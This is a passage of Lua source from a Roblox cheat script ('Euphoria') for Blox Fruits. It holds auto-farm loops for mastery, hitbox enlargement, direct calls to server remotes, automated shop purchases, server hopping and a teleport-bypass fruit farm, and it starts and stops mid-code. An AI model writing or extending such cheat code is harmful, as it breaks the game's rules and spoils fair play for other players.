                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                    farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    farmMasTarget.HumanoidRootPart.CanCollide = false
                                    farmMasTarget.Humanoid.WalkSpeed = 0
                                    farmMasTarget.Head.CanCollide = false
                                    BringMobFarm = true
                                    PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                    EquipWeapon(_G.SelectWeapon)
                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                        StopTween()
                                    end
                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                    _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                    farmMasTarget.HumanoidRootPart.Transparency = 1
                                until not _G.FarmWeaponMastery or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                            else
                                if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                        StopTween()
                                    end
                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                end
                            end
                        else
                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                if getClosest(mobList) then break end
                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                    repeat wait()
                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                            StopTween()
                                        end
                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                end
                            end 
                        end
                    end
                end)
            end
        end)

        FarmFruitMastery = MasterySection:NewToggle("Auto Farm Mastery Fruit [Best Way]", function(state)
            getgenv().EuphoriaSettings['Farm Mastery Best Way'] = state
        end)
        if getgenv().EuphoriaSettings['Farm Mastery Best Way'] then FarmFruitMastery:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings['Farm Mastery Best Way'] then
                        _G.FarmFruitMastery = true
                    else
                        _G.FarmFruitMastery = false
                    end
                end)
            end
        end)

        PosMonMastery = nil
        FarmMasteryTarget = nil
        spawn(function()
            while wait() do
                pcall(function()
                    if _G.FarmFruitMastery then
                        local plrLevel = LP.Data.Level.Value
                        local mobList = {}
                        if plrLevel >= 1500 and third_sea then
                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                        elseif plrLevel >= 700 and second_sea then
                            mobList = {"Water Warrior", "Sea Soldier"}
                        end

                        local _farmMasTarget = getClosest(mobList)
                        if _farmMasTarget then
                            if _farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                toTarget(_farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                            else
                                local st, err = pcall(function()
                                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                        if v.Name == _farmMasTarget.Name and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                            FarmMasteryTarget = v
                                            repeat wait()
                                                FarmMasteryTarget = v
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Humanoid.WalkSpeed = 0
                                                v.Head.CanCollide = false
                                                v.Humanoid:ChangeState(14)
                                                BringMobFarm = false
                                                PosMonMastery = v.HumanoidRootPart.CFrame
                                                BringMobFarmMastery = true
                                                if v.Humanoid.MaxHealth - (v.Humanoid.MaxHealth / 100 * (100 - _G.KillAtPercent)) >= v.Humanoid.Health and getDistance(v.HumanoidRootPart.CFrame) < 200 then
                                                    _G.SpamSkill = true
                                                    EquipWeapon("Fruit")
                                                    wait()
                                                    local args = { [1] = false }
                                                    game:GetService"Workspace".Characters[LP.Name][LP.Data.DevilFruit.Value].RemoteEvent:FireServer(unpack(args))
                                                    PosMonMastery = v.HumanoidRootPart.CFrame
                                                else
                                                    _G.SpamSkill = false
                                                    EquipWeapon(_G.SelectWeapon)
                                                    PosMonMastery = v.HumanoidRootPart.CFrame
                                                end
                                                _G.AimbotPos = v.HumanoidRootPart.CFrame
                                                v.HumanoidRootPart.Transparency = 1
                                            until not _G.FarmFruitMastery or not v.Parent or v.Humanoid.Health <= 0
                                            PosMonMastery = nil
                                            FarmMasteryTarget = nil
                                        end
                                    end
                                end)
                                if err then print(err) end
                            end
                            
                        else
                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                if getClosest(mobList) then break end
                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                    repeat wait()
                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                            StopTween()
                                        end
                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmFruitMastery
                                end
                            end 
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                local s,e = pcall(function()
                    if _G.FarmFruitMastery and FarmMasteryTarget then
                        if LP.Character:FindFirstChildOfClass("Tool") and LP.Character:FindFirstChildOfClass("Tool").ToolTip == "Blox Fruit" then
                            if LP.Character:FindFirstChildOfClass("Tool").Name == "T-Rex-T-Rex" or LP.Character:FindFirstChildOfClass("Tool").Name == "Kitsune-Kitsune" then
                                toTarget(FarmMasteryTarget.HumanoidRootPart.CFrame * CFrame.new(10,5,0))
                                game:GetService'VirtualUser':CaptureController()
                                game:GetService'VirtualUser':Button1Down(Vector2.new(0,1,0,1))
                            elseif LP.Character:FindFirstChildOfClass("Tool").Name == "Control-Control" then
                                toTarget(FarmMasteryTarget.HumanoidRootPart.CFrame * CFrame.new(2,20,0))
                            elseif LP.Character:FindFirstChildOfClass("Tool").Name == "Portal-Portal" then
                                toTarget(FarmMasteryTarget.HumanoidRootPart.CFrame * CFrame.new(22,5,0))
                            else
                                FarmMasteryTarget.HumanoidRootPart.Size = Vector3.new(5,5,5)
                                toTarget(FarmMasteryTarget.HumanoidRootPart.CFrame * CFrame.new(30,15,0))
                            end
                        else
                            toTarget(FarmMasteryTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                        end
                    end
                end)
                if e then print(e, "tween Farm Fruit Mastery") end
            end
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    if _G.SpamSkill and _G.FarmFruitMastery then 
                        if LP.Character:FindFirstChildOfClass("Tool") and LP.Character:FindFirstChildOfClass("Tool").ToolTip == "Blox Fruit" then
                            AttackSkill(FarmMasteryTarget, nil)
                        end
                    end
                end)
            end
        end)

        FarmGunMastery = MasterySection:NewToggle("Auto Farm Gun Mastery [Best Way]", function(state)
            getgenv().EuphoriaSettings['Farm Mastery Best Way Gun'] = state
        end)
        if getgenv().EuphoriaSettings['Farm Mastery Best Way Gun'] then FarmGunMastery:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings['Farm Mastery Best Way Gun'] then
                        _G.FarmGunMastery = true
                    else
                        _G.FarmGunMastery = false
                    end
                end)
            end
        end)

        GunMasteryFirstLoad = true
        spawn(function()
            while wait() do
                local s,e = pcall(function()
                    if _G.FarmGunMastery then
                        if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid") and game:GetService("Players").LocalPlayer.Character.Humanoid.Health > 0 then
                            if GunMasteryFirstLoad then
                                EquipWeapon("Gun")
                                wait(0.5)
                                if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Name == "Soul Guitar" then
                                    wait(1)
                                    local args = {
                                        [1] = "TAP",
                                        [2] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
                                    }
                                    game:GetService("Players").LocalPlayer.Character.Humanoid:FindFirstChild(""):InvokeServer(unpack(args))
                                end
                                GunMasteryFirstLoad = false
                            end
                        end
                        local plrLevel = LP.Data.Level.Value
                        local mobList = {}
                        if plrLevel >= 1500 and third_sea then
                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                        elseif plrLevel >= 700 and second_sea then
                            mobList = {"Water Warrior", "Sea Soldier"}
                        end

                        local _farmMasTarget = getClosest(mobList)
                        if _farmMasTarget then
                            if _farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            else
                                local st, err = pcall(function()
                                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                        if v.Name == _farmMasTarget.Name and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                            repeat wait()
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                FarmMasteryTarget = v
                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Humanoid.WalkSpeed = 0
                                                v.Head.CanCollide = false
                                                v.Humanoid:ChangeState(14)
                                                BringMobFarm = false
                                                BringMobFarmMastery = true
                                                if v.Humanoid.MaxHealth - (v.Humanoid.MaxHealth / 100 * (100 - _G.KillAtPercent)) >= v.Humanoid.Health and getDistance(v.HumanoidRootPart.CFrame) < 200 then
                                                    EquipWeapon("Gun")
                                                    PosMonMastery = v.HumanoidRootPart.CFrame
                                                    wait()
                                                    if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Name == "Soul Guitar" then
                                                        wait(1)
                                                        local args = {
                                                            [1] = {
                                                                ["Platform"] = "Mobile"
                                                            }
                                                        }
                                                        game:GetService("ReplicatedStorage").Remotes.ClientAnalyticsEvent:FireServer(unpack(args))
                                                        if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Name == "Soul Guitar" then 
                                                            local args = {
                                                                [1] = "TAP",
                                                                [2] = Vector3.new(PosMonMastery.X,PosMonMastery.Y,PosMonMastery.Z)
                                                            }
                                                            game:GetService("Players").LocalPlayer.Character.Humanoid:FindFirstChild(""):InvokeServer(unpack(args))
                                                        end
                                                    else
                                                        local args = {
                                                            [1] = {
                                                                ["Platform"] = "Mobile"
                                                            }
                                                        }
                                                        game:GetService("ReplicatedStorage").Remotes.ClientAnalyticsEvent:FireServer(unpack(args))
                                                        wait()
                                                        local args = {
                                                            [1] = PosMonMastery.Position
                                                        }
                                                        game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteFunctionShoot:InvokeServer(unpack(args))
                                                    end
                                                else
                                                    EquipWeapon(_G.SelectWeapon)
                                                    PosMonMastery = v.HumanoidRootPart.CFrame
                                                end
                                                _G.AimbotPos = v.HumanoidRootPart.CFrame
                                                v.HumanoidRootPart.Transparency = 1
                                            until not _G.FarmGunMastery or not v.Parent or v.Humanoid.Health <= 0
                                            PosMonMastery = nil
                                        end
                                        FarmMasteryTarget = nil
                                    end
                                end)
                                if err then print(err) end
                            end
                        else
                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                if getClosest(mobList) then break end
                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                    repeat wait()
                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                            StopTween()
                                        end
                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmFruitMastery
                                end
                            end 
                        end
                    end
                end)
                if e then print(e) end
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.FarmGunMastery and FarmMasteryTarget then
                        toTarget(FarmMasteryTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                    end
                end)
            end
        end)

        local StatsSection = MainTab:NewSection("Stats")
        -- СТАТЫ
        StatsSection:NewToggle("Melee", function(state)
            _G.LearnMelee = state
        end)
        StatsSection:NewToggle("Defense", function(state)
            _G.LearnDefense = state
        end)
        StatsSection:NewToggle("Sword", function(state)
            _G.LearnSword = state
        end)
        StatsSection:NewToggle("Gun", function(state)
            _G.LearnGun = state
        end)
        StatsSection:NewToggle("Fruit", function(state)
            _G.LearnFruit = state
        end)
        StatsSection:NewSlider("Learn Rate", 1, 30, function(s) -- 500 (MaxValue) | 0 (MinValue)
            _G.LearnRate = s
        end)

        local ShopTab = Window:NewTab("Shop")
        if third_sea then
            local BonesShopSection = ShopTab:NewSection("Bones")
            BonesShopSection:NewButton("Random Surprise [50 bones]", function()
                ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
            end)
            AutoBoneRandom = BonesShopSection:NewToggle("Auto Random Surprise", function(state)
                getgenv().EuphoriaSettings["Auto Random Surprise"] = state
                WriteSettings()
            end)
            spawn(function() 
                while wait() do
                    if getgenv().EuphoriaSettings["Auto Random Surprise"] and third_sea then
                        pcall(function()
                            if GetMaterial("Bones") > 50 then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                            end
                        end)
                    end
                end
            end)
            if getgenv().EuphoriaSettings["Auto Random Surprise"] then AutoBoneRandom:UpdateToggle(nil, true) end 
        end
        if second_sea then
            local SwordShopSection = ShopTab:NewSection("Legendary Sword")
            legSword = SwordShopSection:NewLabel("Sword: None")
            swordChecked = false
            spawn(function() 
                while wait(1) do
                    if second_sea then
                        pcall(function()
                            _G.CurrentLegendarySword = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LegendarySwordDealer", "1")
                            swordChecked = true
                            if _G.CurrentLegendarySword then
                                legSword:UpdateLabel("Sword: " .. _G.CurrentLegendarySword)
                                wait(50)
                            else
                                _G.CurrentLegendarySword = nil
                                legSword:UpdateLabel("Sword: None")
                            end
                        end)
                    end
                end
            end)
            AutoFindSwordDealer = false
            AutoFindSwordDealerToggle = SwordShopSection:NewToggle("Auto Find Sword Dealer", function(state)
                getgenv().EuphoriaSettings["Auto Find Sword Dealer"] = state
                WriteSettings()
                AutoFindSwordDealer = state
            end)
            if getgenv().EuphoriaSettings["Auto Find Sword Dealer"] then AutoFindSwordDealerToggle:UpdateToggle(nil, true) end 
            swordDealerPosIndex = 1
            spawn(function() 
                while wait(2) do
                    if second_sea and AutoFindSwordDealer then
                        local s,e = pcall(function()
                            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LegendarySwordDealer", "1") then 
                                SwordDealerPositions = {
                                    [1] = CFrame.new(1180.76355, 80.7010956, 211.826996, 0.796065629, -4.54914884e-10, 0.605210304, 9.17107154e-11, 1, 6.31032115e-10, -0.605210304, -4.46838705e-10, 0.796065629),
                                    [2] = CFrame.new(-1823.44299, 248.825287, 955.936096, 0.351765782, -5.48310375e-08, -0.936088026, 1.41299083e-07, 1, -5.47689405e-09, 0.936088026, -1.30341803e-07, 0.351765782),
                                    [3] = CFrame.new(-330.125793, 20.263937, -1282.57959, -0.66370517, -5.70499292e-09, -0.747994304, 3.69377666e-08, 1, -4.04024192e-08, 0.747994304, -5.44445307e-08, -0.66370517),
                                    [4] = CFrame.new(-2253.45654, 126.062737, -3881.25049, -0.799546897, 8.85608529e-08, -0.60060364, 5.85448277e-08, 1, 6.95159272e-08, 0.60060364, 2.04190069e-08, -0.799546897),
                                    [5] = CFrame.new(-2214.03369, 592.925537, -3249.44434, 0.535449684, -1.45091121e-08, -0.84456712, -4.12766674e-08, 1, -4.33484679e-08, 0.84456712, 5.80718407e-08, 0.535449684),
                                    [6] = CFrame.new(-5587.92529, 314.579468, -829.788208, 0.738063514, -5.72725298e-08, -0.674731255, 1.21583099e-07, 1, 4.81132609e-08, 0.674731255, -1.17546563e-07, 0.738063514),
                                    [7] = CFrame.new(4739.98047, 25.549284, 2849.41211, 0.319690406, -1.09892994e-07, 0.947522044, -2.11281908e-08, 1, 1.23107924e-07, -0.947522044, -5.937585e-08, 0.319690406)
                                }
                                if not workspace.NPCs:FindFirstChild("Legendary Sword Dealer ") then
                                    if swordDealerPosIndex > #SwordDealerPositions then
                                        swordDealerPosIndex = 1
                                    end
                                    currPos = SwordDealerPositions[swordDealerPosIndex]
                                    if getDistance(currPos) < 20 then
                                        swordDealerPosIndex = swordDealerPosIndex + 1
                                    else
                                        if useNearestEntrance(currPos) then
                                            StopTween()
                                        end
                                        toPoint(currPos)
                                    end
                                else
                                    if useNearestEntrance(workspace.NPCs:FindFirstChild("Legendary Sword Dealer ").HumanoidRootPart.CFrame) then
                                        StopTween()
                                    end
                                    toPoint(workspace.NPCs:FindFirstChild("Legendary Sword Dealer ").HumanoidRootPart.CFrame)
                                end
                            else 
                                notis.new("No sword dealer on server"):Display()
                                if not NoSwordDealer then
                                    NoSwordDealer = true
                                    StopTween()
                                end
                                wait(2)
                            end
                        end)
                        if e then print(e) end
                    end
                end
            end)
            AutoBuySword = SwordShopSection:NewToggle("Auto Buy Legendary Sword", function(state)
                getgenv().EuphoriaSettings["Auto Buy Legendary Sword"] = state
                WriteSettings()
            end)
            webhookSended = false
            spawn(function() 
                while wait(2) do
                    if getgenv().EuphoriaSettings["Auto Buy Legendary Sword"] and second_sea and LP.Data.Beli.Value >= 2000000 then
                        pcall(function()
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LegendarySwordDealer", "2")
                        end)
                    end
                end
            end)
            if getgenv().EuphoriaSettings["Auto Buy Legendary Sword"] then AutoBuySword:UpdateToggle(nil, true) end 
            AutoHopSword = SwordShopSection:NewToggle("Hop If No Legendary Sword", function(state)
                getgenv().EuphoriaSettings["Hop If No Legendary Sword"] = state
                WriteSettings()
            end)
            spawn(function() 
                while wait(10) do
                    if getgenv().EuphoriaSettings["Hop If No Legendary Sword"] and second_sea and LP.Data.Beli.Value >= 2000000 and getgenv().EuphoriaSettings["Auto Buy Legendary Sword"] and not (isWeaponInInventory("Wando") and isWeaponInInventory("Saddi") and isWeaponInInventory("Shisui")) then
                        pcall(function()
                            if not _G.CurrentLegendarySword or isWeaponInInventory(_G.CurrentLegendarySword) then
                                HopToLowestServer()
                            end
                        end)
                    end
                end
            end)
            if getgenv().EuphoriaSettings["Hop If No Legendary Sword"] then AutoHopSword:UpdateToggle(nil, true) end 
            SwordShopSection:NewButton("Buy True Triple Katana", function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan","1")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan","2")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan","3")
            end)
        end
        
        local FragmentsShopSection = ShopTab:NewSection("Fragments")
        FragmentsShopSection:NewButton("Reset Stats [2500 FRAG]", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","1")
            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","2")
        end)
        FragmentsShopSection:NewButton("Reroll Race [3000 FRAG]", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward","Reroll","1")
            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward","Reroll","2")
        end)
        local ColorSection = ShopTab:NewSection("Haki Colors")
        local ColorLabel = ColorSection:NewLabel("Current Color: Loading...")
        HakiColor = "loading"
        spawn(function()
            while wait() do
                pcall(function()
                    local args = {
                        [1] = "ColorsDealer",
                        [2] = "1"
                    }
                    HakiColor = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    if not HakiColor or string.len(HakiColor) < 2 then
                        ColorLabel:UpdateLabel("Current Color: Not found")
                    else
                        ColorLabel:UpdateLabel("Current Color: " .. HakiColor)
                    end
                end)
            end
        end)
        ColorSection:NewButton("Buy Haki Color", function()
            local args = {
                [1] = "ColorsDealer",
                [2] = "2"
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end)
        AutoFindLegendaryColorToggle = ColorSection:NewToggle("Auto Find Legendary Color", function(state)
            getgenv().EuphoriaSettings["Auto Find Legendary Color"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Auto Find Legendary Color"] then AutoFindLegendaryColorToggle:UpdateToggle(nil, true) end 
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Find Legendary Color"] then
                        AutoFindLegendaryColor = true
                    else
                        AutoFindLegendaryColor = false
                    end
                end)
            end
        end)
        spawn(function()
            while wait() do
                pcall(function()
                    if AutoFindLegendaryColor then
                        if HakiColor ~= "loading" then
                            if HakiColor ~= nil then
                                if HakiColor == "Winter Sky" then
                                    local args = {
                                        [1] = "ColorsDealer",
                                        [2] = "2"
                                    }
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                                else
                                    HopToLowestServer()
                                end
                            else
                                HopToLowestServer()
                            end
                        end
                    end
                end)
            end
        end)
        local FruitSection = ShopTab:NewSection("Fruit")
        FruitSection:NewButton("Open Fruit Shop", function()
            local args = {
                [1] = "GetFruits"
            }
            ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            LP.PlayerGui.Main.FruitShop.Visible = true
        end)
        FruitSection:NewButton("Buy Random Fruit", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("Cousin" , "Buy")
        end)
        AutoBuyRndFruit = FruitSection:NewToggle("Auto Buy Random Fruit", function(state)
            getgenv().EuphoriaSettings["Auto Buy Random Fruit"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Auto Buy Random Fruit"] then AutoBuyRndFruit:UpdateToggle(nil, true) end 
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Buy Random Fruit"] then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("Cousin" , "Buy")
                        wait(100)
                    end
                end)
            end
        end)
        
        SelectedFruitFromStock = FruitSection:NewDropdown("Fruit for Auto Buy", {"Portal","Buddha","Venom","Dough","Leopard","Kitsune"},function(choice)
            getgenv().EuphoriaSettings["Fruit for Auto Buy"] = choice
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Fruit for Auto Buy"] then SelectedFruitFromStock:UpdateSelect(getgenv().EuphoriaSettings["Fruit for Auto Buy"]) end 
        AutoBuyFromStockFruit = FruitSection:NewToggle("Auto Buy Fruit from stock", function(state)
            getgenv().EuphoriaSettings["Auto Buy Fruit from stock"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Auto Buy Fruit from stock"] then AutoBuyFromStockFruit:UpdateToggle(nil, true) end 
        spawn(function()
            while wait() do
                pcall(function()

                    if getgenv().EuphoriaSettings["Fruit for Auto Buy"] then
                        if LP.Data.DevilFruit.Value ~= getgenv().EuphoriaSettings["Fruit for Auto Buy"] .. '-' .. getgenv().EuphoriaSettings["Fruit for Auto Buy"] then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseRawFruit", getgenv().EuphoriaSettings["Fruit for Auto Buy"] .. '-' .. getgenv().EuphoriaSettings["Fruit for Auto Buy"],false)
                        end
                    end
                end)
            end
        end)
        FruitSection:NewLabel(" ")
        AutoStoreFruit = FruitSection:NewToggle("Auto Store Fruit", function(state)
            getgenv().EuphoriaSettings["Auto Store Fruit"] = state
            WriteSettings()
            _G.AutoStoreFruit = state
        end)
        if getgenv().EuphoriaSettings["Auto Store Fruit"] then AutoStoreFruit:UpdateToggle(nil, true) end 
        AutoFarmFruitsBypass = FruitSection:NewToggle("Auto Farm Fruits [Bypass TP]", function(state)
            getgenv().EuphoriaSettings["Auto Farm Fruits Bypass TP"] = state
            WriteSettings()
            _G.AutoFarmFruitsBypass = state
            _G.ActivateBypassDefense = state
        end)
        if getgenv().EuphoriaSettings["Auto Farm Fruits Bypass TP"] then AutoFarmFruitsBypass:UpdateToggle(nil, true) end 
        AutoFarmFruitsSafe = FruitSection:NewToggle("Auto Farm Fruits [ SAFE ]", function(state)
            getgenv().EuphoriaSettings["Auto Farm Fruits Safe"] = state
            WriteSettings()
            _G.AutoFarmFruitsSafe = state
        end)
        if getgenv().EuphoriaSettings["Auto Farm Fruits Safe"] then AutoFarmFruitsSafe:UpdateToggle(nil, true) end 
        HopWhenNoFruits = FruitSection:NewToggle("Hop When No Fruits On Server", function(state)
            getgenv().EuphoriaSettings["Hop When No Fruits On Server"] = state
            WriteSettings()
            _G.HopWhenNoFruits = state
        end)
        if getgenv().EuphoriaSettings["Hop When No Fruits On Server"] then HopWhenNoFruits:UpdateToggle(nil, true) end 
        IgnoreFruitsForHop = FruitSection:NewToggle("Ignore Fruits in Hands for Hop", function(state)
            getgenv().EuphoriaSettings["Ignore Fruits in Hands for Hop"] = state
            WriteSettings()
            _G.IgnoreFruitsForHop = state
        end)
        if getgenv().EuphoriaSettings["Ignore Fruits in Hands for Hop"] then IgnoreFruitsForHop:UpdateToggle(nil, true) end 


        spawn(function() 
            while wait() do
                if _G.AutoStoreFruit then
                    pcall(function()
                        if isFruitsInInventory() then
                            storeAllFruits()
                        end
                    end)
                end
            end
        end)
        spawn(function() 
            while wait(.1) do
                if _G.AutoFarmFruitsSafe then
                    _G.AutoRejoinServer = true
                    pcall(function()
                        if isFruitsOnServer() then
                            local fruitTarget = findNearestFruit()
                            if fruitTarget then
                                repeat wait()
                                    if useNearestEntrance(fruitTarget:GetPivot()) then
                                        StopTween()
                                    end
                                    toTarget(fruitTarget:GetPivot())
                                until not fruitTarget or not fruitTarget.Parent or fruitTarget.Parent.Name ~= 'Workspace' or not _G.AutoFarmFruitsSafe
                            end
                            fruitTarget = nil
                        end
                    end)
                end
            end
        end)
        spawn(function() 
            while wait(.1) do
                if _G.AutoFarmFruitsBypass then
                    if not LP:FindFirstChild("Humanoid") or not LP:FindFirstChild("HumanoidRootPart") or LP.Humanoid.Health <= 0 then
                        wait(5)
                    end
                    _G.AutoRejoinServer = true
                    pcall(function()
                        if isFruitsOnServer() then
                            takeFruits()
                        end
                    end)
                end
            end
        end)
        spawn(function() 
            while wait() do
                if _G.ActivateBypassDefense == true then
                    pcall(function()
                        task.wait(4)
                        if not isFruitsInInventory() and _G.ActivateBypassDefense == true then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetTeam","Pirates")
                            return
                        end
                        return
                    end)
                end
            end
        end)

        spawn(function() 
            while wait() do
                if _G.HopWhenNoFruits and (_G.AutoFarmFruitsSafe or _G.AutoFarmFruitsBypass) then
                    wait(5)
                    pcall(function()
                        if _G.IgnoreFruitsForHop then
                            if not isFruitsOnServer() and _G.HopWhenNoFruits and (_G.AutoFarmFruitsSafe or _G.AutoFarmFruitsBypass) then
                                HopServer()
                            end
                        else
                            if not isWorthFruitInInventory() and not isFruitsInInventory() and not isFruitsOnServer() and _G.HopWhenNoFruits and (_G.AutoFarmFruitsSafe or _G.AutoFarmFruitsBypass) then
                                HopServer()
                            end
                        end
                    end)
                end
            end
        end)
        
        FightingStyleSelected = nil
        local FSSection = ShopTab:NewSection("Fighting Styles")
        FSSection:NewDropdown("Select Melee for buy", {"Black Leg", "Electro", "Fishman Karate", "Dragon Claw", "Superhuman", "Death Step", "Sharkman Karate", "Electric Claw", "Dragon Talon", "Godhuman"}, function(choice)
            FightingStyleSelected = choice
        end)
        FSSection:NewButton("Buy Selected Melee", function()
            if FightingStyleSelected == "Black Leg" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
            elseif FightingStyleSelected == "Electro" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
            elseif FightingStyleSelected == "Fishman Karate" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
            elseif FightingStyleSelected == "Dragon Claw" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")
            elseif FightingStyleSelected == "Superhuman" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman") 
            elseif FightingStyleSelected == "Death Step" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep") 
            elseif FightingStyleSelected == "Sharkman Karate" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate",true)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")   
            elseif FightingStyleSelected == "Electric Claw" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
            elseif FightingStyleSelected == "Dragon Talon" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
            elseif FightingStyleSelected == "Godhuman" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
            end
        end)

        SwordSelected = nil
        local SwordSection = ShopTab:NewSection("Swords")
        SwordSection:NewDropdown("Select Sword for buy", {"Cutlass", "Katana", "Iron Mace", "Dual Katana", "Triple Katana", "Pipe", "Dual-Headed Blade", "Bisento", "Soul Cane", "Pole v.2"}, function(choice)
            SwordSelected = choice
        end)
        SwordSection:NewButton("Buy Selected Sword", function()
            if SwordSelected == "Cutlass" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cutlass")
            elseif SwordSelected == "Katana" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Katana")
            elseif SwordSelected == "Iron Mace" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Iron Mace")
            elseif SwordSelected == "Dual Katana" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Duel Katana")
